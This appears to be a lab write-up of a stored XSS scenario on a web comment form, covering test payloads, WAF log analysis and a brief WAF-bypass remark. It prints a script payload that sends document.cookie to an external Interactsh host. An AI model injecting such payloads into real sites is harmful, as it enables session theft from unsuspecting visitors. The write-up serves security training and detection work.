# Stored XSS Scenario

<img width="1919" height="926" alt="image" src="https://github.com/user-attachments/assets/a3f3f163-5775-4775-93be-2dd646b78ca2" />

## Objective

The objective of this scenario is to analyze and exploit a Stored Cross-Site Scripting (XSS) vulnerability and demonstrate its potential impact on a web application.

The application allows users to submit comments through a POST request. The submitted data is stored by the application and later displayed on the website without proper output encoding or sanitization. This allows an attacker to inject malicious content that can be executed when other users access the affected page.

This simulation focuses on both the offensive and defensive aspects of the attack, including vulnerability identification, exploitation, WAF monitoring, SIEM correlation, detection engineering, and the potential impact of Stored XSS.

## Vulnerable Application

The following screenshots show how the web application receives two parameters: Author and Body.

The application stores the submitted comments and displays them to other users in the comments section. However, the user-controlled input is inserted into the HTML response without proper output encoding.

As a result, malicious JavaScript submitted through these parameters can be executed in the browser of users who access the affected page.

Vulnerable parameters: Author and Body
HTTP method: POST
Vulnerability type: Stored XSS

<img width="580" height="424" alt="image" src="https://github.com/user-attachments/assets/9e4dbf0c-3fc1-4647-9051-97bd2afca31b" />

<img width="1131" height="938" alt="image" src="https://github.com/user-attachments/assets/365b430e-937c-43c1-afc2-3264a80d8222" />

## Attack Simulation

During the reconnaissance phase, an attacker may identify the comment section as a potential attack vector and investigate how the application handles user input.

The initial objective is to understand how submitted data is reflected on the page and whether any input validation or output encoding is applied.

<img width="1919" height="925" alt="image" src="https://github.com/user-attachments/assets/69325fe5-e20a-4fb9-aea7-6ce908d62c90" />

An attacker may first test whether HTML tags are interpreted by the application. For example, submitting an `<h1>` tag can reveal whether the input is rendered as HTML instead of being displayed as plain text.

<img width="1918" height="935" alt="image" src="https://github.com/user-attachments/assets/194ecb15-6857-4985-95e4-207ce525000b" />

HTML injection can help identify how the application processes user input, but it does not necessarily confirm an XSS vulnerability.

To verify JavaScript execution, a simple test payload can be submitted:

`<script>alert(1)</script>`

Although this payload is commonly used during vulnerability testing, it is mainly a proof of execution. An attacker conducting a real attack may use less noticeable JavaScript code depending on their objectives.

<img width="1913" height="924" alt="image" src="https://github.com/user-attachments/assets/e43bcfbd-3937-41ec-a58b-2d1e9ee22fa7" />

The result confirms that the submitted JavaScript is stored by the application and executed when the page is loaded by another visitor.

<img width="1919" height="932" alt="image" src="https://github.com/user-attachments/assets/f587fdbc-f80c-41ec-a58b-2d1e9ee22c90" />

An attacker may attempt to steal a victim's cookies to gain access to their session. However, in a stored XSS scenario, the attacker may not know which users will eventually visit the affected page and execute the injected JavaScript.
To investigate this possibility, I tested whether JavaScript could access browser cookies and trigger an external request using Interactsh.

using the following script : <script>new Image().src="http://rnzqykfauknrzujcplkpu5k4lv3rxsg5w.oast.fun" + document.cookie;</script> 

<img width="812" height="528" alt="image" src="https://github.com/user-attachments/assets/498292c7-f246-4955-ba87-8aede4d547bd" />

When another user accessed the affected page, Interactsh received an external request, confirming that the injected JavaScript executed in their browser.

However, no cookie value was received. This suggests that the tested cookie was not accessible through JavaScript, potentially due to the HttpOnly attribute or because no JavaScript-accessible cookies were present.

<img width="1919" height="990" alt="image" src="https://github.com/user-attachments/assets/91295bc6-e8eb-4c18-b8d4-2f0dd27aa7ce" />

<img width="1919" height="989" alt="image" src="https://github.com/user-attachments/assets/e68f6e52-6cef-4ce2-9d0f-3261ad3242b4" />

Depending on the application and the victim's browser context, an attacker could potentially use stored XSS to access information available to JavaScript, manipulate page content, or perform actions through the victim's authenticated session.

## WAF Analys

During the assessment, the default OWASP CRS configuration allowed HTML tags such as <h1>, since they were not considered malicious by the configured rules. This allowed HTML content to be rendered on the frontend, demonstrating that the WAF does not prevent every form of HTML injection.

<img width="1919" height="933" alt="image" src="https://github.com/user-attachments/assets/9dfd099f-f4c2-4944-8752-3c360d6f54ae" />

<img width="1919" height="761" alt="image" src="https://github.com/user-attachments/assets/4eb593d2-0899-4255-930e-04742e566aef" />

In separate tests, the OWASP CRS detected and blocked JavaScript-related payloads. The WAF generated audit logs containing useful information for security monitoring and investigation.

Some relevant information from the logs included:

[tag "attack-xss"]

[tag "paranoia-level/1"]

[tag "OWASP_CRS"]

unique_id "avIdvdktPCNkG62TXFfZHwAAAEQ"

Inbound Anomaly Score Exceeded (Total Inbound Score: 15 - SQLI=0,XSS=15,RFI=0,LFI=0,RCE=0,PHPI=0,HTTP=0,SESS=0)

The logs also provided information such as the timestamp, source IP, request parameter and triggered CRS rules.

This information allows a security analyst to identify which WAF rules were triggered and correlate the event with other security logs.

For example, repeated XSS-related events from the same source IP, or attempts involving different attack categories, could be correlated in the SIEM to provide additional context and help determine whether further investigation is necessary.

## WAF BYPASS

As demonstrated in the SSTI scenario, the application backend can also be accessed through a port that is not protected by the WAF. This provides an alternative path to reach the application without passing through the WAF inspection layer.

This bypass was already demonstrated in the previous SSTI scenario, so it will not be repeated here.








